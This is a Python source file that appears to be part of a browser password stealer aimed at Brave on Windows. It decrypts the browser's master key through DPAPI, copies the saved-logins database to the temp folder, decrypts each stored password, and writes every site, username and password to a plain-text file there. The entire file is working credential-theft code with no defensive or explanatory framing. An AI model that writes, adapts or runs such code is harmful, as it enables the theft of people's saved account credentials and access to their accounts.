import os
import json
import base64
import sqlite3
import win32crypt
from Crypto.Cipher import AES
import shutil

TEMP = os.getenv("TEMP")
ROAMING = os.getenv("APPDATA")
LOCAL = os.getenv("LOCALAPPDATA")


def bothInstalled():
    chrome = False
    brave = False
    if os.path.exists(LOCAL + r'\BraveSoftware\Brave-Browser\User Data\default\Login Data'):
        brave = True
    if os.path.exists(LOCAL + r'\Google\Chrome\User Data\Local State'):
        chrome = True
    if chrome is True & brave is True:
        return True


def get_master_key():
    with open(os.environ['USERPROFILE'] + os.sep + r'AppData\Local\BraveSoftware\Brave-Browser\User Data\Local State',
              "r", encoding='utf-8') as f:
        local_state = f.read()
        local_state = json.loads(local_state)
    master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    master_key = master_key[5:]
    master_key = win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]
    return master_key


def decrypt_payload(cipher, payload):
    return cipher.decrypt(payload)


def generate_cipher(aes_key, iv):
    return AES.new(aes_key, AES.MODE_GCM, iv)


def decrypt_password(buff, master_key):
    try:
        iv = buff[3:15]
        payload = buff[15:]
        cipher = generate_cipher(master_key, iv)
        decrypted_pass = decrypt_payload(cipher, payload)
        decrypted_pass = decrypted_pass[:-16].decode()
        return decrypted_pass
    except Exception:
        return "Chrome < 80"


def get_password():
    master_key = get_master_key()
    login_db = os.environ[
                   'USERPROFILE'] + os.sep + r'AppData\Local\BraveSoftware\Brave-Browser\User Data\default\Login Data'
    shutil.copy2(login_db,
                 TEMP + r"\Loginvault.db")
    conn = sqlite3.connect(TEMP + r"\Loginvault.db")
    cursor = conn.cursor()

    try:
        cursor.execute("SELECT action_url, username_value, password_value FROM logins")
        if not bothInstalled():
            w = open(TEMP + r"\login.txt", "w+")
        else:
            w = open(TEMP + r"\bravelogin.txt", "w+")
        for r in cursor.fetchall():
            url = r[0]
            username = r[1]
            encrypted_password = r[2]
            decrypted_password = decrypt_password(encrypted_password, master_key)
            if username != "" or decrypted_password != "":
                w.write("Site: " + url + "\nUsername: " + username + "\nPassword: " + decrypted_password + "\n**********\n\n")
    except Exception:
        pass

    cursor.close()
    conn.close()
    os.remove(TEMP + r"\Loginvault.db")
